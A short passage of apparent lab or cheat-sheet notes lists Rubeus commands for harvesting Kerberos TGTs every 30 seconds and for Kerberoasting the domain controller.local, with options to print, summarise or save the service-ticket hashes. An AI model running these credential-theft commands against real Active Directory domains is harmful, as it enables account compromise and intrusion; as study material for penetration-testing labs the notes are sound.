This Command tells rubeus to harvest for TGTs every 30 seconds
```
Rubeus.exe harvest /interval:30
```

## Kerberoasting
no wrap
```
Rubeus.exe kerberoast /domain:controller.local /nowrap
```
stats
```
Rubeus.exe kerberoast /domain:controller.local /stats
```
outfile
```
Rubeus.exe kerberoast /domain:controller.local /outfile:hashes.txt
```
